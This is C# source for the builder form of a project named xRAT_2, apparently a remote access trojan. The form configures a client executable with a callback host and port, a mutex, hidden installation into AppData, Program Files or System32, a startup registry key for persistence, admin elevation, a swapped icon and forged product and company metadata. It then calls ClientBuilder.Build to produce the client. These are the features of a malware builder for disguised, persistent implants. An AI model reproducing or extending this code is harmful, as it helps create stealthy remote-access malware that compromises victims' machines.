﻿using Core;
using Core.Build;
using System;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using xRAT_2.Settings;

namespace xRAT_2.Forms
{
    public partial class frmBuilder : Form
    {
        public frmBuilder()
        {
            InitializeComponent();
        }

        private void LoadProfile(string profilename)
        {
            ProfileManager pm = new ProfileManager(profilename + ".xml");
            txtHost.Text = pm.ReadValue("Hostname");
            txtPort.Text = pm.ReadValue("ListenPort");
            txtPassword.Text = pm.ReadValue("Password");
            txtDelay.Text = pm.ReadValue("Delay");
            txtMutex.Text = pm.ReadValue("Mutex");
            chkInstall.Checked = bool.Parse(pm.ReadValue("InstallClient"));
            txtInstallname.Text = pm.ReadValue("InstallName");
            GetInstallpath(int.Parse(pm.ReadValue("InstallPath"))).Checked = true;
            txtInstallsub.Text = pm.ReadValue("InstallSub");
            chkHide.Checked = bool.Parse(pm.ReadValue("HideFile"));
            chkStartup.Checked = bool.Parse(pm.ReadValue("AddStartup"));
            txtRegistryKeyName.Text = pm.ReadValue("RegistryName");
            chkElevation.Checked = bool.Parse(pm.ReadValue("AdminElevation"));
            chkIconChange.Checked = bool.Parse(pm.ReadValue("ChangeIcon"));

            // new profile options - fallback for old version
            chkChangeAsmInfo.Checked = bool.Parse((!string.IsNullOrEmpty(pm.ReadValue("ChangeAsmInfo"))) ? pm.ReadValue("ChangeAsmInfo") : "False");
            txtProductName.Text = pm.ReadValue("ProductName");
            txtDescription.Text = pm.ReadValue("Description");
            txtCompanyName.Text = pm.ReadValue("CompanyName");
            txtCopyright.Text = pm.ReadValue("Copyright");
            txtTrademarks.Text = pm.ReadValue("Trademarks");
            txtOriginalFilename.Text = pm.ReadValue("OriginalFilename");
            txtProductVersion.Text = pm.ReadValue("ProductVersion");
            txtFileVersion.Text = pm.ReadValue("FileVersion");
        }

        private void SaveProfile(string profilename)
        {
            ProfileManager pm = new ProfileManager(profilename + ".xml");
            pm.WriteValue("Hostname", txtHost.Text);
            pm.WriteValue("ListenPort", txtPort.Text);
            pm.WriteValue("Password", txtPassword.Text);
            pm.WriteValue("Delay", txtDelay.Text);
            pm.WriteValue("Mutex", txtMutex.Text);
            pm.WriteValue("InstallClient", chkInstall.Checked.ToString());
            pm.WriteValue("InstallName", txtInstallname.Text);
            pm.WriteValue("InstallPath", GetInstallpath().ToString());
            pm.WriteValue("InstallSub", txtInstallsub.Text);
            pm.WriteValue("HideFile", chkHide.Checked.ToString());
            pm.WriteValue("AddStartup", chkStartup.Checked.ToString());
            pm.WriteValue("RegistryName", txtRegistryKeyName.Text);
            pm.WriteValue("AdminElevation", chkElevation.Checked.ToString());
            pm.WriteValue("ChangeIcon", chkIconChange.Checked.ToString());
            pm.WriteValue("ChangeAsmInfo", chkChangeAsmInfo.Checked.ToString());
            pm.WriteValue("ProductName", txtProductName.Text);
            pm.WriteValue("Description", txtDescription.Text);
            pm.WriteValue("CompanyName", txtCompanyName.Text);
            pm.WriteValue("Copyright", txtCopyright.Text);
            pm.WriteValue("Trademarks", txtTrademarks.Text);
            pm.WriteValue("OriginalFilename", txtOriginalFilename.Text);
            pm.WriteValue("ProductVersion", txtProductVersion.Text);
            pm.WriteValue("FileVersion", txtFileVersion.Text);
        }

        private void frmBuilder_Load(object sender, EventArgs e)
        {
            LoadProfile("Default");
            if (string.IsNullOrEmpty(txtMutex.Text))
            {
                txtPort.Text = XMLSettings.ListenPort.ToString();
                txtPassword.Text = XMLSettings.Password;
                txtMutex.Text = Helper.GetRandomName(32);
            }

            txtInstallname.Enabled = chkInstall.Checked;
            rbAppdata.Enabled = chkInstall.Checked;
            rbProgramFiles.Enabled = chkInstall.Checked;
            rbSystem.Enabled = chkInstall.Checked;
            txtInstallsub.Enabled = chkInstall.Checked;
            chkHide.Enabled = chkInstall.Checked;
            chkStartup.Enabled = chkInstall.Checked;

            txtRegistryKeyName.Enabled = (chkInstall.Checked && chkStartup.Checked);

            ToggleAsmInfoControls();
        }

        private void frmBuilder_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (MessageBox.Show("Do you want to save your current settings?", "Save your settings?", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                SaveProfile("Default");
            }
        }

        private void chkShowPass_CheckedChanged(object sender, EventArgs e)
        {
            txtPassword.PasswordChar = (chkShowPass.Checked) ? '\0' : '•';
        }

        private void txtPort_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar))
                e.Handled = true;
        }

        private void txtDelay_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar))
                e.Handled = true;
        }

        private void txtInstallname_KeyPress(object sender, KeyPressEventArgs e)
        {
            string illegal = new string(System.IO.Path.GetInvalidPathChars()) + new string(System.IO.Path.GetInvalidFileNameChars());
            if ((e.KeyChar == '\\' || illegal.Contains(e.KeyChar.ToString())) && !char.IsControl(e.KeyChar))
                e.Handled = true;
        }

        private void txtInstallsub_KeyPress(object sender, KeyPressEventArgs e)
        {
            string illegal = new string(System.IO.Path.GetInvalidPathChars()) + new string(System.IO.Path.GetInvalidFileNameChars());
            if ((e.KeyChar == '\\' || illegal.Contains(e.KeyChar.ToString())) && !char.IsControl(e.KeyChar))
                e.Handled = true;
        }

        private void txtInstallname_TextChanged(object sender, EventArgs e)
        {
            RefreshExamplePath();
        }

        private void rbAppdata_CheckedChanged(object sender, EventArgs e)
        {
            RefreshExamplePath();
        }

        private void rbProgramFiles_CheckedChanged(object sender, EventArgs e)
        {
            RefreshExamplePath();
        }

        private void rbSystem_CheckedChanged(object sender, EventArgs e)
        {
            RefreshExamplePath();
        }

        private void txtInstallsub_TextChanged(object sender, EventArgs e)
        {
            RefreshExamplePath();
        }

        private void btnMutex_Click(object sender, EventArgs e)
        {
            txtMutex.Text = Helper.GetRandomName(32);
        }

        private void chkInstall_CheckedChanged(object sender, EventArgs e)
        {
            txtInstallname.Enabled = chkInstall.Checked;
            rbAppdata.Enabled = chkInstall.Checked;
            rbProgramFiles.Enabled = chkInstall.Checked;
            rbSystem.Enabled = chkInstall.Checked;
            txtInstallsub.Enabled = chkInstall.Checked;
            chkHide.Enabled = chkInstall.Checked;
            chkStartup.Enabled = chkInstall.Checked;
            txtRegistryKeyName.Enabled = (chkInstall.Checked && chkStartup.Checked);
        }

        private void chkStartup_CheckedChanged(object sender, EventArgs e)
        {
            txtRegistryKeyName.Enabled = chkStartup.Checked;
        }

        private void chkChangeAsmInfo_CheckedChanged(object sender, EventArgs e)
        {
            ToggleAsmInfoControls();
        }

        private void RefreshExamplePath()
        {
            string path = string.Empty;
            if (rbAppdata.Checked)
                path = System.IO.Path.Combine(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), txtInstallsub.Text), txtInstallname.Text);
            else if (rbProgramFiles.Checked)
                path = System.IO.Path.Combine(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), txtInstallsub.Text), txtInstallname.Text);
            else if (rbSystem.Checked)
                path = System.IO.Path.Combine(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), txtInstallsub.Text), txtInstallname.Text);

            this.Invoke((MethodInvoker)delegate
            {
                txtExamplePath.Text = path + ".exe";
            });
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(txtHost.Text) && !string.IsNullOrEmpty(txtPort.Text) && !string.IsNullOrEmpty(txtDelay.Text) && !string.IsNullOrEmpty(txtPassword.Text) && !string.IsNullOrEmpty(txtMutex.Text))
            {
                if (!chkInstall.Checked || (chkInstall.Checked && !string.IsNullOrEmpty(txtInstallname.Text) && !string.IsNullOrEmpty(txtInstallsub.Text)))
                {
                    if (!chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrEmpty(txtRegistryKeyName.Text)))
                    {
                        string output = string.Empty;
                        string icon = string.Empty;

                        if (chkIconChange.Checked)
                        {
                            using (OpenFileDialog ofd = new OpenFileDialog())
                            {
                                ofd.Filter = "Icons *.ico|*.ico";
                                ofd.Multiselect = false;
                                if (ofd.ShowDialog() == DialogResult.OK)
                                    icon = ofd.FileName;
                            }
                        }

                        using (SaveFileDialog sfd = new SaveFileDialog())
                        {
                            sfd.Filter = "EXE Files *.exe|*.exe";
                            sfd.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                            sfd.FileName = "Client-built.exe";
                            if (sfd.ShowDialog() == DialogResult.OK)
                                output = sfd.FileName;
                        }

                        if (!string.IsNullOrEmpty(output) && (!chkIconChange.Checked || !string.IsNullOrEmpty(icon)))
                        {
                            try
                            {
                                string[] asmInfo = null;
                                if (chkChangeAsmInfo.Checked)
                                {
                                    if (!IsValidVersionNumber(txtProductVersion.Text) || !IsValidVersionNumber(txtFileVersion.Text))
                                    {
                                        MessageBox.Show("Please enter a valid version number!\nExample: 1.0.0.0", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                        return;
                                    }
                                    asmInfo = new string[8];
                                    asmInfo[0] = txtProductName.Text;
                                    asmInfo[1] = txtDescription.Text;
                                    asmInfo[2] = txtCompanyName.Text;
                                    asmInfo[3] = txtCopyright.Text;
                                    asmInfo[4] = txtTrademarks.Text;
                                    asmInfo[5] = txtOriginalFilename.Text;
                                    asmInfo[6] = txtProductVersion.Text;
                                    asmInfo[7] = txtFileVersion.Text;
                                }
                                ClientBuilder.Build(output, txtHost.Text, txtPassword.Text, txtInstallsub.Text, txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked, chkStartup.Checked, chkHide.Checked, int.Parse(txtPort.Text), int.Parse(txtDelay.Text), GetInstallpath(), chkElevation.Checked, icon, asmInfo);
                                MessageBox.Show("Successfully built client!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(string.Format("An error occurred!\n\nError Message: {0}\nStack Trace:\n{1}", ex.Message, ex.StackTrace), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            }
                        }
                    }
                    else
                        MessageBox.Show("Please fill out all required fields!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                    MessageBox.Show("Please fill out all required fields!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
                MessageBox.Show("Please fill out all required fields!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private int GetInstallpath()
        {
            if (rbAppdata.Checked)
                return 1;
            else if (rbProgramFiles.Checked)
                return 2;
            else if (rbSystem.Checked)
                return 3;
            else
                return 1;
        }

        private RadioButton GetInstallpath(int installpath)
        {
            switch (installpath)
            {
                case 1:
                    return rbAppdata;
                case 2:
                    return rbProgramFiles;
                case 3:
                    return rbSystem;
                default:
                    return rbAppdata;
            }
        }

        private void ToggleAsmInfoControls()
        {
            this.Invoke((MethodInvoker)delegate
            {
                foreach (Control ctrl in groupAsmInfo.Controls)
                {
                    if (ctrl is Label)
                        ((Label)ctrl).Enabled = chkChangeAsmInfo.Checked;
                    else if (ctrl is TextBox)
                        ((TextBox)ctrl).Enabled = chkChangeAsmInfo.Checked;
                }
            });
        }

        private bool IsValidVersionNumber(string input)
        {
            Match match = Regex.Match(input, @"^[0-9]+\.[0-9]+\.(\*|[0-9]+)\.(\*|[0-9]+)$", RegexOptions.IgnoreCase);
            return match.Success;
        }
    }
}
